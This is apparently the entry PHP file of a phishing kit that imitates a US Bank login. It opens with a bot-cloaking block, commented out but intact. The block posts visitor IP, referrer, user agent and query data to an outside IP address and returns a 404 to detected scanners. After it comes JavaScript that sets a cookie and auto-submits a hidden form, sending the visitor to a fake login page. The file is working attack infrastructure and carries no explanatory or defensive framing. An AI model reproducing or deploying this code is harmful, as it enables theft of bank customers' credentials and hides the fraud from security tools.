<?php 
	// $codenamemode = 'API'; $sourceid = ''; $flowdomain = 'f271611'; if (version_compare(PHP_VERSION, '5.4', '>=')) {} else { echo 'Update PHP to version 5.4 or higher'; die; } function _is_curl_installed() { if (in_array ('curl', get_loaded_extensions())) {return true;}else{return false;}} if (_is_curl_installed()) {} else {echo 'Install CURL on server'; die;} @$_SERVER['HTTP_ACCEPT_LANGUAGE'] = $_SERVER['HTTP_ACCEPT_LANGUAGE']; if (!function_exists('getRealIpAddrAF')){ function getRealIpAddrAF() { if ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])<>'127.0.0.1')) {$ip=$_SERVER['GEOIP_ADDR'];} elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])<>'127.0.0.1') && (($_SERVER['HTTP_X_FORWARDED_FOR'])<>($_SERVER['SERVER_ADDR']))) {$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];} elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])<>'127.0.0.1') && (($_SERVER['HTTP_CLIENT_IP'])<>($_SERVER['SERVER_ADDR']))) {$ip=$_SERVER['HTTP_CLIENT_IP'];} elseif ((!empty($_SERVER['HTTP_X_REAL_IP'])) && (($_SERVER['HTTP_X_REAL_IP'])<>'127.0.0.1') && (($_SERVER['HTTP_X_REAL_IP'])<>($_SERVER['SERVER_ADDR']))) {$ip=$_SERVER['HTTP_X_REAL_IP'];} else {$ip=$_SERVER['REMOTE_ADDR'];} return $ip; }}$ip=getRealIpAddrAF(); if (!function_exists('getRealref')){ function getRealref() { if(empty($_SERVER['HTTP_REFERER'])) { $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER'); } return $_SERVER['HTTP_REFERER']; }} $ref=getRealref(); if (!function_exists('getRealua')){function getRealua() { if(empty($_SERVER['HTTP_USER_AGENT'])) { $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); } return $_SERVER['HTTP_USER_AGENT']; }} $ua=getRealua(); if ($_SERVER['QUERY_STRING']<>''){ $data = ''.urlencode($_SERVER['QUERY_STRING']).''; } else {$data = '';} $langua = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://104.193.252.21/apipost.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, 'fd='.$flowdomain.'&ip='.$ip.'&ref='.$ref.'&ua='.$ua.'&data='.$data.'&sourceid='.$sourceid.'&langua='.$langua.''); $ifbot = curl_exec($ch); curl_close($ch); if ($ifbot <> '0') { header ( 'HTTP/1.1 404 Not Found' ); die; } else { echo ''; } 
?>

<?php
session_start();

include 'gen.php';
?>
	<script>
		go_to = "http://localhost/us_bank/login.php";
		function readCookie(cookieName){
			var start = document.cookie.indexOf(cookieName);
			if (start == -1){
				document.cookie = "seenit=yes; expires=" + ged(num_days);
			} else {
				window.location = go_to;
			}
		}
		readCookie("seenit");
	
		function submitform()
		{
			document.forms["myform"].submit();
		}
	</script>
	<form id="ponyo_form" action="<?php echo "login.php?i_d=".generateRandomString(); ?>" method="POST">
		<input type="hidden" name="LOB" value="RBGLogon" />
	</form>
	<script>
		document.getElementById("ponyo_form").submit();
	</script>